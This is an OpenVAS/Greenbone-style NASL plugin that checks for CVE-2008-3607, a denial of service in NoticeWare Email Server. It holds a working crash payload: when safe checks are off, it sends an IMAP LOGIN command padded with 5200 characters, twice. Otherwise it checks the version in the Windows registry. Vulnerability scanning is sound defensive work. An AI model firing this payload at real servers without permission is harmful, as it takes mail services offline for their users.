if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900027" );
	script_version( "2021-08-18T10:41:57+0000" );
	script_tag( name: "last_modification", value: "2021-08-18 10:41:57 +0000 (Wed, 18 Aug 2021)" );
	script_tag( name: "creation_date", value: "2008-08-22 10:29:01 +0200 (Fri, 22 Aug 2008)" );
	script_cve_id( "CVE-2008-3607" );
	script_bugtraq_id( 30605 );
	script_copyright( "Copyright (C) 2008 Greenbone Networks GmbH" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_category( ACT_MIXED_ATTACK );
	script_family( "Denial of Service" );
	script_name( "NoticeWare Email Server NG LOGIN Messages DoS Vulnerability" );
	script_dependencies( "imap4_banner.sc", "smb_reg_service_pack.sc", "os_detection.sc" );
	script_mandatory_keys( "Host/runs_windows" );
	script_require_ports( 139, 445, "Services/imap", 143 );
	script_tag( name: "affected", value: "Noticeware Email Server 4.6.3 and prior on Windows (All)." );
	script_tag( name: "insight", value: "Security flaw is due to improper bounds checking of the user supplied
  data to imap LOGIN command (Long string of 5000 characters on tcp/143)." );
	script_tag( name: "summary", value: "The host is running NoticeWare Email Server, which is prone to
  denial of service vulnerability." );
	script_tag( name: "solution", value: "Upgrade to Noticeware Email Server 5.1 or later." );
	script_tag( name: "impact", value: "Remote attackers can crash or deny the service by executing
  long LOGIN string." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/495259" );
	script_tag( name: "qod_type", value: "registry" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("smb_nt.inc.sc");
require("imap_func.inc.sc");
require("secpod_smb_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
if(!safe_checks()){
	imap_port = imap_get_port( default: 143 );
	banner = imap_get_banner( port: imap_port );
	if(!ContainsString( banner, "NoticeWare" )){
		exit( 0 );
	}
	sock = open_sock_tcp( imap_port );
	if(!sock){
		exit( 0 );
	}
	data = NASLString( "A001 LOGIN ", crap( data: "A", length: 5200 ), " \\r\\n" );
	send( socket: sock, data: data );
	rcv = recv( socket: sock, length: 1024 );
	close( sock );
	sleep( 20 );
	sock = open_sock_tcp( imap_port );
	if(sock){
		send( socket: sock, data: data );
		rcv = recv( socket: sock, length: 1024 );
		close( sock );
	}
	if(!ContainsString( rcv, "NoticeWare" )){
		security_message( port: imap_port, data: NASLString( "NoticeWare Email Server service has been crashed on the target system.\\nRestart the service to resume normal operations." ) );
		exit( 0 );
	}
	exit( 99 );
}
if(!registry_key_exists( key: "SOFTWARE\\NoticeWare\\EmailServer" )){
	exit( 0 );
}
key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\";
for entry in registry_enum_keys( key: key ) {
	mailName = registry_get_sz( key: key + entry, item: "DisplayName" );
	if(mailName && ContainsString( mailName, "NoticeWare Email Server" )){
		mailVer = registry_get_sz( key: key + entry, item: "DisplayVersion" );
		if(mailVer && egrep( pattern: "^([0-3]\\..*|4\\.[0-5](\\..*)?|4\\.6(\\.[0-3])?)$", string: mailVer )){
			security_message( port: 0 );
			exit( 0 );
		}
		exit( 99 );
	}
}
exit( 0 );

